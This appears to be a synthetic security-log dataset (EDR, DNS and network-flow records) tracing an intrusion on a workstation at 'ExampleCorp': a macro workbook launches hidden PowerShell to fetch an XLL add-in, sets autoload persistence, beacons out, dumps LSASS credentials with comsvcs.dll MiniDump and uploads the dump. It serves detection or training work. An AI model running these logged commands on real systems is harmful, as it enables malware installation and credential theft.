@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-12-07T08:32:12Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,excel.exe,"EXCEL.EXE ""C:\Users\asmith\Downloads\OpenEnrollment.xlsm""",,,,Sysmon: excel started,"{""@timestamp"": ""2024-12-07T08:32:12Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Sysmon: excel started"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""excel.exe"", ""pid"": 4100, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""EXCEL.EXE \""C:\\Users\\asmith\\Downloads\\OpenEnrollment.xlsm\""""}}"
2024-12-07T08:32:15Z,network,dns,WKSTN-022,10.10.22.44,asmith,10.10.22.44,,,,,,,,,DNS: query=ctldl.windowsupdate.com answer=13.107.4.50 ttl=300,"{""@timestamp"": ""2024-12-07T08:32:15Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=ctldl.windowsupdate.com answer=13.107.4.50 ttl=300"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""dns"": {""question"": {""name"": ""ctldl.windowsupdate.com""}, ""answers"": [{""data"": ""13.107.4.50"", ""ttl"": 300}]}}"
2024-12-07T08:32:18Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,powershell.exe,"powershell.exe -NoP -W Hidden -Command ""iwr https://office-addin-support.com/assets/ExcelTools.xll -OutFile $env:APPDATA\Microsoft\AddIns\ExcelTools.xll""",,,,EDR: Office spawning PowerShell to download XLL,"{""@timestamp"": ""2024-12-07T08:32:18Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: Office spawning PowerShell to download XLL"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""powershell.exe"", ""pid"": 4210, ""parent"": {""name"": ""excel.exe"", ""pid"": 4100}, ""command_line"": ""powershell.exe -NoP -W Hidden -Command \""iwr https://office-addin-support.com/assets/ExcelTools.xll -OutFile $env:APPDATA\\Microsoft\\AddIns\\ExcelTools.xll\""""}}"
2024-12-07T08:32:20Z,network,dns,WKSTN-022,10.10.22.44,asmith,10.10.22.44,,,,,,,,,DNS first_seen office-addin-support.com -> 185.128.27.44,"{""@timestamp"": ""2024-12-07T08:32:20Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS first_seen office-addin-support.com -> 185.128.27.44"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""dns"": {""question"": {""name"": ""office-addin-support.com""}, ""answers"": [{""data"": ""185.128.27.44"", ""ttl"": 60}]}}"
2024-12-07T08:32:24Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS download sni=office-addin-support.com bytes_in~180KB,"{""@timestamp"": ""2024-12-07T08:32:24Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS download sni=office-addin-support.com bytes_in~180KB"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 181200}}"
2024-12-07T08:32:28Z,endpoint,file_write,WKSTN-022,10.10.22.44,asmith,,,,,,,C:\Users\asmith\AppData\Roaming\Microsoft\AddIns\ExcelTools.xll,a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0,,EDR: XLL add-in written to AddIns,"{""@timestamp"": ""2024-12-07T08:32:28Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: XLL add-in written to AddIns"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\asmith\\AppData\\Roaming\\Microsoft\\AddIns\\ExcelTools.xll"", ""hash"": {""sha256"": ""a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0""}}}"
2024-12-07T08:32:30Z,network,dns,WKSTN-022,10.10.22.44,asmith,10.10.22.44,,,,,,,,,DNS: query=login.microsoftonline.com answer=20.190.155.134 ttl=300,"{""@timestamp"": ""2024-12-07T08:32:30Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=login.microsoftonline.com answer=20.190.155.134 ttl=300"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""dns"": {""question"": {""name"": ""login.microsoftonline.com""}, ""answers"": [{""data"": ""20.190.155.134"", ""ttl"": 300}]}}"
2024-12-07T08:32:36Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,20.190.155.134,443,,,,,,,FLOW: benign TLS traffic,"{""@timestamp"": ""2024-12-07T08:32:36Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW: benign TLS traffic"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""20.190.155.134"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 5800}}"
2024-12-07T08:32:40Z,endpoint,registry_set,WKSTN-022,10.10.22.44,asmith,,,,,,,,,,Registry: Excel auto-load add-in configured,"{""@timestamp"": ""2024-12-07T08:32:40Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""registry_set"", ""kind"": ""event"", ""category"": [""registry""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Registry: Excel auto-load add-in configured"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""registry"": {""path"": ""HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Options\\OPEN"", ""data"": {""strings"": [""/R \\\""C:\\Users\\asmith\\AppData\\Roaming\\Microsoft\\AddIns\\ExcelTools.xll\\\""""]}}}"
2024-12-07T08:32:45Z,network,dns,WKSTN-022,10.10.22.44,asmith,10.10.22.44,,,,,,,,,DNS: query=clients2.google.com answer=142.250.74.78 ttl=300,"{""@timestamp"": ""2024-12-07T08:32:45Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=clients2.google.com answer=142.250.74.78 ttl=300"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""dns"": {""question"": {""name"": ""clients2.google.com""}, ""answers"": [{""data"": ""142.250.74.78"", ""ttl"": 300}]}}"
2024-12-07T10:45:00Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,excel.exe,EXCEL.EXE,,,,Excel launched later (addin autoload),"{""@timestamp"": ""2024-12-07T10:45:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""Excel launched later (addin autoload)"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""excel.exe"", ""pid"": 5100, ""parent"": {""name"": ""explorer.exe"", ""pid"": 1500}, ""command_line"": ""EXCEL.EXE""}}"
2024-12-07T10:46:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T10:46:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T10:51:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T10:51:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T10:56:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T10:56:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T10:58:10Z,endpoint,process_start,WKSTN-022,10.10.22.44,asmith,,,,,rundll32.exe,"rundll32.exe comsvcs.dll, MiniDump 688 C:\Users\asmith\AppData\Local\Temp\lsass.dmp full",,,,EDR: suspicious LSASS dump command,"{""@timestamp"": ""2024-12-07T10:58:10Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: suspicious LSASS dump command"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""process"": {""name"": ""rundll32.exe"", ""pid"": 5220, ""parent"": {""name"": ""excel.exe"", ""pid"": 5100}, ""command_line"": ""rundll32.exe comsvcs.dll, MiniDump 688 C:\\Users\\asmith\\AppData\\Local\\Temp\\lsass.dmp full""}}"
2024-12-07T10:58:20Z,endpoint,file_write,WKSTN-022,10.10.22.44,asmith,,,,,,,C:\Users\asmith\AppData\Local\Temp\lsass.dmp,c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0ab,,EDR: credential dump file created,"{""@timestamp"": ""2024-12-07T10:58:20Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: credential dump file created"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""file"": {""path"": ""C:\\Users\\asmith\\AppData\\Local\\Temp\\lsass.dmp"", ""hash"": {""sha256"": ""c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0ab""}}}"
2024-12-07T10:59:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS upload (possible credential dump exfil),"{""@timestamp"": ""2024-12-07T10:59:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload (possible credential dump exfil)"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 4120000}}"
2024-12-07T10:59:15Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS upload (possible credential dump exfil),"{""@timestamp"": ""2024-12-07T10:59:15Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload (possible credential dump exfil)"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 4120000}}"
2024-12-07T10:59:30Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS upload (possible credential dump exfil),"{""@timestamp"": ""2024-12-07T10:59:30Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload (possible credential dump exfil)"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 4120000}}"
2024-12-07T11:01:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T11:01:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T11:06:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T11:06:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T11:11:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T11:11:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T11:16:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T11:16:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
2024-12-07T11:21:00Z,network,flow,WKSTN-022,10.10.22.44,asmith,10.10.22.44,185.128.27.44,443,,,,,,,TLS beacon sni=office-addin-support.com interval~5m,"{""@timestamp"": ""2024-12-07T11:21:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS beacon sni=office-addin-support.com interval~5m"", ""host"": {""name"": ""WKSTN-022"", ""ip"": [""10.10.22.44""]}, ""user"": {""name"": ""asmith"", ""email"": null}, ""source"": {""ip"": ""10.10.22.44""}, ""destination"": {""ip"": ""185.128.27.44"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 2000}}"
